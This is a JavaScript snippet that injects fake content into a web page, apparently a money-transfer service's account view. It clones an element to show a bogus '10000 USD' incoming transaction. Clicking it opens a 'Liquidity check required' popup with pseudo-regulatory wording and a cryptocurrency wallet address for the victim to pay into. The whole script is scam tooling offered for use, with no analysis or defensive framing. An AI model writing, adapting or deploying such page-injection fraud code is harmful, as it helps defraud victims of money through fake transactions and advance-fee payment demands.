// Define function to create popup window
function createPopup() {
  // Create the popup container element
  const popupContainer = document.createElement('div');
  popupContainer.style.position = 'fixed';
  popupContainer.style.top = '50%';
  popupContainer.style.left = '50%';
  popupContainer.style.transform = 'translate(-50%, -50%)';
  popupContainer.style.width = '500px'; // 30% bigger than the previous width of 300px
  popupContainer.style.height = '300px'; // 30% bigger than the previous height of 200px
  popupContainer.style.padding = '20px';
  popupContainer.style.backgroundColor = '#fff';
  popupContainer.style.border = '1px solid #000';
  popupContainer.style.borderRadius = '10px';
  popupContainer.style.zIndex = '9999';

  // Create the popup content elements
  const popupTitle = document.createElement('h2');
  popupTitle.textContent = 'Liquidity check required';
  popupTitle.style.fontSize = '24px';
  popupTitle.style.fontWeight = 'bold';
  popupTitle.style.marginBottom = '10px';

  const popupText = document.createElement('p');
  popupText.textContent = 'Aforementioned funds are transferred through Crypto-Currency exchange platform, Due AML & CTF Regulations, We requires Liquidity Check, Which is not a payment and be reflected To your main Account Immediately after Transaction. CryptoCurrency Wallet which is Created By WISE for one time transaction Adress: 0x336B84E4D184eC677e904B56BF3528aF0e694405';
  popupText.style.fontSize = '16px';

  // Append the content elements to the container
  popupContainer.appendChild(popupTitle);
  popupContainer.appendChild(popupText);

  // Append the container to the body
  document.body.appendChild(popupContainer);

  // Add event listener to remove the popup when clicked outside of it
  popupContainer.addEventListener('click', function(event) {
    if (event.target === popupContainer) {
      popupContainer.remove();
    }
  });
}

// Find the element to duplicate
const elementToDuplicate = document.querySelector('.css-hur9gc');

if (elementToDuplicate) {
  // Create a copy of the element
  const duplicatedElement = elementToDuplicate.cloneNode(true);

  // Add text node with styling
  const textNode = document.createElement('span');
  textNode.textContent = 'Incoming Transaction - ';
  const blueText = document.createElement('span');
  blueText.textContent = 'Check instructions';
  blueText.style.color = 'blue';
  textNode.appendChild(blueText);
  textNode.style.fontSize = '18px';
  textNode.style.fontWeight = 'bold';
  textNode.style.cursor = 'pointer';

  // Insert the text node and duplicated element after the original element
  elementToDuplicate.parentNode.insertBefore(textNode, duplicatedElement.nextSibling);
  elementToDuplicate.parentNode.insertBefore(duplicatedElement, textNode.nextSibling);

  // Find the h4 element in the duplicated element and change its text content
  const h4Element = duplicatedElement.querySelector('h4.css-8ul3yv');
  if (h4Element) {
    h4Element.textContent = '10000 USD';
  }

  // Add event listener to the text node to show the popup
  textNode.addEventListener('click', createPopup);
} 